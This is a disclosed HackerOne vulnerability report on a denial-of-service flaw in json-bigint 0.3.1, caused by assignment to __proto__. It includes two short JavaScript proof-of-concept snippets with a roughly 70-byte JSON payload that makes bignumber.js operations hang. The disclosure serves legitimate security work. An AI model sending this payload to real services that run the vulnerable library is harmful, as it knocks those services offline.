---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '916430'
original_report_id: '916430'
title: '[json-bigint] DoS via `__proto__` assignment'
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2020-07-06T07:06:56.720Z'
disclosed_at: '2020-08-25T22:40:36.029Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: json-bigint
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# [json-bigint] DoS via `__proto__` assignment

## Metadata

- HackerOne Report ID: 916430
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-25T22:40:36.029Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a DoS in `json-bigint`.
It allows to cause denial of service using very limited input (~70 bytes).

# Module

**module name:** `json-bigint`
**version:**  0.3.1
**npm page:** `https://www.npmjs.com/package/json-bigint`

## Module Description

> JSON.parse/stringify with bigints support. Based on Douglas Crockford JSON.js package and bignumber.js library.

## Module Stats

2 301 424 weekly downloads

# Vulnerability

## Vulnerability Description

Json parsing library assigns to `__proto__`, which can be abused to confuse `bignumber.js` library, causing a DoS on various operations with the resulting number (stringification, arithmetic) via a very small input (70 bytes).

## Steps To Reproduce:

```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}'
const r = JSONbig.parse(json)
console.log(r.toString())
```

Note that the object parsed, but an attempt to convert it to a string (or to do any arithmetic operation on it) will hang.

Demo with arithmetic operation hanging:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"0":42,"length":2}}'
const r = JSONbig.parse(json)
r.dividedBy(42)
```

## Patch

Be careful when assigning to `__proto__` value.

## Supporting Material/References:

- [OPERATING SYSTEM VERSION]: `Linux xps 5.7.6-arch1-1 #1 SMP PREEMPT Thu, 25 Jun 2020 00:14:47 +0000 x86_64 GNU/Linux`
- [NODEJS VERSION]: 14.5.0

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

Denial of service via untrusted input.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
